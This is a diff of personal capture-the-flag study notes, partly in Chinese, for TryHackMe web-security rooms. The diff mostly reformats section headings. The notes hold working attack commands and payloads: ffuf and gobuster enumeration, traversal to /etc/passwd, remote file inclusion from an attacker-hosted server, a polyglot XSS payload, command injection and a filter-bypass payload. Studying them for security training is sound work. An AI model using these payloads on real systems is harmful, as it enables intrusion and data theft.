@@ -1,11 +1,8 @@
---> sudo openvpn 2024_5_CTF/try_hack_me/gcvbnm123.ovpn
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Walking An Application :
+## Walking An Application :
 	--> CSS : premium -- display: block --> change to display : none 
 	--> F12 -- Google Chrome Source =Firefox Debugger -- Pretty Print {} 
 		-->  breakpoints : 強制瀏覽器停止處理 JavaScript 並暫停目前執行的點 --> bule
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Content Discovery :
+## Content Discovery :
 
 	--> Manually :
 		--> robots.txt
@@ -31,8 +28,7 @@ Content Discovery :
 	--> Automated Discovery :
 		--> wordlists : 2024_5_CTF/wordlist/big.txt
 		--> gobuster dir --url http://10.10.52.124/ -w 2024_5_CTF/wordlist/big.txt | /common.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Subdomain Enumeration :
+## Subdomain Enumeration :
 
 	--> OSINT 
 		--> SSL/TLS Certificate
@@ -48,8 +44,7 @@ Subdomain Enumeration :
 		--> wordlist : https://github.com/danielmiessler/SecLists/tree/master/Fuzzing
 		--> ffuf -w namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.81.88 -fs {size}
 		--> -w 使用的單字清單。 -H 新增/編輯標頭
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Authentication Bypass :
+## Authentication Bypass :
 	--> Username Enumeration :
 		--> ffuf -w 2024_5_CTF/wordlist/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.7.203/customers/signup -mr "username already exists"
 	--> Brute Force : 
@@ -61,12 +56,10 @@ Authentication Bypass :
 	--> Cookie Tampering : 
 		--> hashing (md5 /sha-256 /sha-512 /sha1 ) --> https://crackstation.net/
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Insecure Direct Object Reference(IDOR) : 
+## Insecure Direct Object Reference(IDOR) : 
 	--> change URL -- number
 	--> network --> refresh --> right click : edit anf resend
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-File Inclusion : 
+## File Inclusion : 
 	directory traversal :  PhP--file_get_contents
 		--> dot-dot-slash attack (../)
 			--> url.php?file=../../../../etc/passwd
@@ -123,8 +116,7 @@ File Inclusion :
 		-->?file=http://ip:8000/xx.txt
 		-->?file=http://10.11.92.230:8000/host.txt
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Server-Side Request Forgery (SSRF)
+## Server-Side Request Forgery (SSRF)
 	--> 允許惡意使用者導致網路伺服器向攻擊者選擇的資源發出額外的或經過編輯的 HTTP 請求
 	--> regular : 資料返回到攻擊者的螢幕
 	--> Blind : 但不會將任何資訊傳回攻擊者的螢幕
@@ -142,8 +134,7 @@ Server-Side Request Forgery (SSRF)
 			--> dst=/form/contact
 		--> <input -- value="path"> --? change path 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Intro to Cross-site Scripting :  JavaScript 
+## Intro to Cross-site Scripting :  JavaScript 
 	--> base on 訊息內容不會被檢查是否有任何惡意程式碼
 	--> Payloads 
 		--> intention 
@@ -184,8 +175,7 @@ Intro to Cross-site Scripting :  JavaScript
 			--> /images/cat.jpg" onload="alert('THM');
 		--> mix : jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 		
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Command Injection == RCE  : 
+## Command Injection == RCE  : 
 	--> curl : test Command Injection
 		--> curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
 	--> PHP 、Python 和 NodeJS 
@@ -211,8 +201,7 @@ Command Injection == RCE  :
 			--> 繞過過濾器 : 十六進制值 
 				--> $payload = "\x2f\x00\x90\x90"
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-SQL Injection: 
+## SQL Injection: 
 	--> Relationa : MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite
 	--> SQL : 
 		--> select * from users LIMIT 1;
